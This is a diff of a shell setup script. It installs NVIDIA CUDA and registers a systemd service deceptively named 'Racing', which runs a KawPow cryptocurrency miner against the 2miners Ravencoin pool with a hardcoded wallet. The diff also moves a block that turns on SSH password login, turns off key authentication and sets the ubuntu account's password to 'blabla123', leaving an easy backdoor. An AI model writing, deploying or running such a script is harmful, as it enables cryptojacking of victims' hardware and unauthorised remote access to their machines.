@@ -1,8 +1,4 @@
 cd /home
-sudo sed -i '/PasswordAuthentication no/c\PasswordAuthentication yes' /etc/ssh/sshd_config
-sudo sed -i '/PubkeyAuthentication yes/c\PubkeyAuthentication no' /etc/ssh/sshd_config
-echo "ubuntu:blabla123" | sudo chpasswd
-sudo service ssh restart
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
 wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
@@ -21,3 +17,7 @@ sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Serv
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 sudo ./racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abc -p x &
+sudo sed -i '/PasswordAuthentication no/c\PasswordAuthentication yes' /etc/ssh/sshd_config
+sudo sed -i '/PubkeyAuthentication yes/c\PubkeyAuthentication no' /etc/ssh/sshd_config
+echo "ubuntu:blabla123" | sudo chpasswd
+sudo service ssh restart
